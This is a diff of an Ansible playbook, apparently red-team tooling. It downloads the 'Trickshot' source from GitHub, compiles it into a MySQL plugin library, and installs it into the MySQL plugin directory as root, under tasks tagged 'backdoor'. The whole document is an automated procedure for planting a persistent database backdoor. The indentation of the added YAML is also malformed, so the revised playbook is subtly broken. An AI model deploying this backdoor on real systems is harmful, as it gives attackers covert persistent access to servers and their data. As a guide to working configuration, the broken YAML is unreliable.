@@ -1,17 +1,22 @@
 ---
-# https://github.com/RITRedteam/Trickshot
-- name: Get trickshot.c file from GitHub
-  get_url:
-    url: https://raw.githubusercontent.com/RITRedteam/Trickshot/master/trickshot.c
-    dest: /tmp/trickshot.c
+- name: Install trickshot
+  block:
+    # https://github.com/RITRedteam/Trickshot
+    - name: Get trickshot.c file from GitHub
+    get_url:
+        url: https://raw.githubusercontent.com/RITRedteam/Trickshot/master/trickshot.c
+        dest: /tmp/trickshot.c
 
-- name: Compile trickshot.c with gcc
-  command: gcc -I/usr/include/mysql -shared -fPIC -o tg.so /tmp/trickshot.c
-  args:
-    creates: tg.so
+    - name: Compile trickshot.c with gcc
+    command: gcc -I/usr/include/mysql -shared -fPIC -o tg.so /tmp/trickshot.c
+    args:
+        creates: tg.so
 
-- name: Move trickshot to plugins dir
-  command: cp -f tg.so /usr/lib/mysql/plugin/
-  args:
-    creates: /usr/lib/mysql/plugin/tg.so
-  become: true
+    - name: Move trickshot to plugins dir
+    command: cp -f tg.so /usr/lib/mysql/plugin/
+    args:
+        creates: /usr/lib/mysql/plugin/tg.so
+    become: true
+  tags:
+    - hard
+    - backdoor
